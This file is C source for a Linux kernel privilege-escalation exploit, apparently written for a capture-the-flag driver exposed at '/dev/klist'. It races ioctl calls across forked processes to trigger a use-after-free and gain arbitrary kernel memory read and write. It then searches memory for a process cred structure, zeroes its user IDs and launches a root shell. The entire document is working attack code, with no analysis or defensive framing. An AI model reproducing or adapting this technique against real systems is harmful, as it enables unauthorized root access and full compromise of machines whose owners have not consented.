#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/mman.h>
#define _GNU_SOURCE         /* See feature_test_macros(7) */
#include <string.h>
#define ADD_ITEM    0x1337
#define SELECT_ITEM 0X1338
#define REMOVE_ITEM 0X1339
#define LIST_HEAD   0X133A
#define BUFF_SIZE 96-48
#define MEM_SIZE 0X300000
struct add_opt
{
  size_t size;
  char * mem;
};
void print_hex(char *buf,int size){
	int i;
	puts("======================================");
	printf("data :\n");
	for (i=0 ; i<(size/8);i++){
		if (i%2 == 0){
			printf("%d",i/2);
		}
		printf(" %16llx",*(size_t * )(buf + i*8));
		if (i%2 == 1){
			printf("\n");
		}		
	}
	puts("======================================");
}

int add_item(int fd,size_t size,char * content){
	struct add_opt opt;
	opt.size = size;
	opt.mem = malloc(size);
	if (opt.mem == 0){
		return -1;
	}
	memcpy(opt.mem,content,size);
	ioctl(fd,ADD_ITEM,&opt);
	return 0;
}

int list_head(int fd,char *mem){
	if (mem!=0){
		ioctl(fd,LIST_HEAD,mem);
		return 0;
	}
}

int select_item(int fd,size_t idx){
	ioctl(fd,SELECT_ITEM,idx);
	return 0;
}

int remove_item(int fd,size_t idx){
	ioctl(fd,REMOVE_ITEM,idx);
	return 0;
}

int myMemmem(char * a, int alen, char * b, int blen)
{
	int i, j;
	for (i = 0; i <= alen - blen; ++ i)
	{
		for (j = 0; j < blen; ++ j)
		{
			if (a[i + j] != b[j])
			{
				break;
			}
		}
		if (j >= blen)
		{
			return i;
		}
	}
	return -1;
}
void set_cred_root(char *cred,int len,int id){
	int i;
	for(i=0;i<len;i+=4){
		if(*(int *)(cred+i) == id )
			*(int *)(cred+i) =0;
	}
}

int main(){
	static int fd ;
	int i,mem_len;
	setvbuf(stdout, 0LL, 2, 0LL);
	//char a[]="p4nda";
	char *mem = malloc(0x1000);
	char *result = malloc(0x1000);
	char *large_mem = NULL;
	int found = NULL;
	char cred[0x20];
	char *final = 0;

	fd = open("/dev/klist",O_RDWR);
	if(fd < 0){
		puts("[-] open file error!");
		exit(-1);
	}
	for(i = 0; i<0x1000;i++){
		mem[i] = 'a';
	}
	add_item(fd,96-0x18,mem);
	if(fork()==0){
		int j = 0;
		for(;j<1000;j++){
			add_item(fd,96-0x18,mem);
			list_head(fd,result);
			//print_hex(result,0x10);
			if (*(int *)result == 1){
				printf("[+] now we trigger a UAF chunk,with [%d] chunk\n",j);
				//puts();
				print_hex(result,0xc0);
				exit(-1);
			}
		}
		exit(0);
	}
	for(i = 0;i<3000;i++){
		list_head(fd,result);
	}
	getchar();
	if(fork()==0){
		for (i=0;i<20;i++){
			printf("%d",i);
			system("./pwn_msg");
		}
		exit(0);
	}

	sleep(3);
	select_item(fd,0);
	read(fd,result,0x1000);
	print_hex(result,0xc0);
	if(*(size_t * )result == 0x6161616161616161) {
		puts("[-] cannot realloc the chunk ");
		exit(-1);
	}
	puts("[+] now we can read everywhere");
	//read(fd,result,0x1000);
	//print_hex(result,0xc0);

	large_mem = malloc(MEM_SIZE);//mmap(0,MEM_SIZE,PROT_READ|PROT_WRITE,MAP_ANONYMOUS,0,0);
	if (large_mem == 0xffffffffffffffff ){
		puts("[-] cannot mmap large memory");
		exit(-1);
	}
	printf("[+] mmap addr %p\n",large_mem);
	memset(large_mem,MEM_SIZE,0);
	print_hex(large_mem,0x100);
	mem_len = read(fd,large_mem,MEM_SIZE);
	printf("[+] read %d byte\n", mem_len );
	print_hex(large_mem,0x100);
	//memcpy(cred,)
	*(size_t *)cred = 0x000003e800000003;
	*(size_t *)(cred+8) = 0x000003e8000003e8;
	*(size_t *)(cred+0x10) = 0x000003e8000003e8;
	*(size_t *)(cred+0x18) = 0x000003e8000003e8;
	found = myMemmem(large_mem,MEM_SIZE,cred,0x20);
	if (found==-1){
		puts("[-]cannot find cred struct !");
		exit(-1);
	}
	printf("[+] start %p\n",large_mem);
	final = found+large_mem;
	printf("[+] found %p\n",final);
	print_hex(final-0x8,0xb0);
	set_cred_root(final-0x8,0x40,1000);
	print_hex(final-0x8,0xb0);
	getchar();
	write(fd,large_mem,found+0xb0);
	//system("/bin/sh");
	if (getuid() == 0){
		printf("[+]now you are r00t,enjoy ur shell\n");
		system("/bin/sh");
	}
	else{
		puts("[-] there must be something error ... ");
		exit(-1);
	}

}